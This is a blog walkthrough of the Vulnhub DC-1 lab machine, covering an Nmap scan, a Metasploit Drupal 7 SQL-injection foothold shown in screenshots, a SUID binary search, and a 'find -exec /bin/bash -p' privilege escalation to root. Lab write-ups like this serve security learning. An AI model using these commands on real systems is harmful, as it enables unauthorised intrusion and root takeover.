---
layout: single
title: "Vulnhub DC-1 Walkthrough"
date: 2023-10-18
author_profile: true
comments: true
categories:
  - DC-Series
tags: []
header:
  overlay_image: /assets/images/dc-1/cover.png
  overlay_filter: 0.3  # optional, darkens the image for readability
  caption: "DC-1 Vulnhub Walkthrough"
excerpt: "Step-by-step walkthrough of the DC-1 machine from Vulnhub."
feature_row:
  - image_path: /assets/images/dc-1/cover.png
    alt: "DC-1 Cover"
    title: "DC-1 Walkthrough"
    excerpt: "A practical guide to rooting the DC-1 Vulnhub machine."
    url: "#"
    btn_label: "Read More"
    btn_class: "btn--primary"
toc: true
toc_sticky: true
---




This box is relatively straightforward; there are publicly available exploits that make it even easier. To gain an initial foothold, all we need to do is identify the service and its version. Once we have this information, a quick search on Google or in the Searchsploit database provides us with a suitable exploit. The Metasploit framework offers a good exploit in many cases, which I utilized.

For privilege escalation, we need to locate SUID binaries and abuse them. In this instance, there were two such binaries: 'exim4' and 'find.' The techniques and tactics for this type of privilege escalation are also publicly available.

# Information Gathering

First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4d659e6774c227a961660678b42488f (DSA)
|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39675/tcp   status
|   100024  1          42139/tcp6  status
|   100024  1          47521/udp6  status
|_  100024  1          50689/udp   status
39675/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the Nmap results, various services confirmed that it's a Debian-based Linux machine. Only a few minimal ports are open, with the most promising one being port 80. Port 22 is also open, but I currently lack the credentials to attempt an SSH attack. Therefore, I will begin my investigation by focusing on the web server running on port 80. 

# Manual Inspection
![](/assets/images/dc-1/manual-inspection.png)

This site is built with the Drupal content management system, and our Nmap scan confirmed that it's running Drupal version 7. Rather than wasting time, I decided to search for publicly available exploits for Drupal 7. Using Searchsploit, I found a Metasploit exploit.

![](/assets/images/dc-1/searchsploit.png)

Let's proceed to Metasploit and check for exploits. While searching in Metasploit, I discovered a SQL injection vulnerability. Let's start by attempting this one first.

![](/assets/images/dc-1/msf-search.png)

# Initial Foothold

![](/assets/images/dc-1/Initial-foothold.png)

This application is vulnerable to a SQL injection vulnerability, which allowed me to gain a remote shell on the machine. I've obtained the initial foothold, and now it's time to proceed with privilege escalation to gain root privileges.

# Post Enumeration

After obtaining the initial foothold, I conducted a thorough examination of the file system permissions, looking for misconfiguration, extra privilege files, and possible stored passwords. During this process, I checked for SUID files and identified two potential privilege escalation vectors: 'find' and 'exim4.' Both of these files have SUID permissions, making it relatively easy to abuse this type of permission for privilege escalation

```bash
Command: find / -perm -u=s -type f 2>/dev/null

Response: 

/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

# Privilege Escalation

First, I would like to attempt privilege escalation using the 'find' command. There is a payload available in GTFOBins for this purpose.

```bash
bash-4.2$ find . -exec /bin/bash -p \; -quit
find . -exec /bin/bash -p \; -quit
bash-4.2# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

It worked, and I've achieved root access. It shows that my user is still 'www-data', but my EUID is 0 (root), and my groups are 0 (root). This means I have all the permissions of the root user.

![](/assets/images/dc-1/root.png)


#h@ppyh@cking